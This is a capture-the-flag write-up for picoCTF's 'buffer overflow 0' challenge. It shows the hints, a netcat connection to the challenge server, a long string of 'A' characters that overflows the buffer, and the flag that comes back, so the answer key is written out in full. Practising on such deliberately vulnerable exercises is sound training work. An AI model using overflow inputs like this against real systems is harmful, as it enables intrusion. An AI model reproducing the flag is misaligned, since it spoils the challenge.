# buffer overflow 0

## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c).Connect using:`nc saturn.picoctf.net 53189`

## Pistas

| No. Pista | Pista                                                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------------------------------- |
| 1         | How can you trigger the flag to print?                                                                                      |
| 2         | If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting |
| 3         | Run `man gets` and read the BUGS section. How many characters can the program really read?                                  |


## Solucion
```bash
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ nano vuln.c
                                                               
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ nc saturn.picoctf.net 53189

Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

```

## Notas adicionales

## Referencias